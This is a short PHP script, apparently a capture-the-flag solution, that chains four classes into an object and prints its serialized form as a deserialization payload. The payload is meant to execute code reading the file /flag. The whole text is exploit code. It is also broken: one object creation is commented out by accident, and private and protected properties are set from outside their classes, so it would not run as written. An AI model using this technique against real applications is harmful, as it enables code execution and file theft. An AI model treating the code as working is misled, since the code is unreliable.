<?php

class class000 {
    private $payl0ad = 1; // Change to 1 to bypass the die() statement
    protected $what;
}

class class001 {
    public $payl0ad;
    public $a;
}

class class002 {
    private $sec;
}

class class003 {
    public $mystr;
}

// 创建class003对象并设置要执行的代码
$exploit_code = 'echo file_get_contents("/flag");'; // 假设flag在/flag文件中$class003 = new class003();
$class003->mystr =$exploit_code;

// 创建class002对象并设置sec属性为class003对象
$class002 = new class002();$class002->sec = $class003;

// 创建class001对象并设置a属性为class002对象，payl0ad属性为class003对象
$class001 = new class001();$class001->a = $class002;$class001->payl0ad = $class003;

// 创建class000对象并设置what属性为class001对象
$class000 = new class000();$class000->what = $class001;

// 序列化攻击向量
$payload = serialize($class000);
echo $payload;
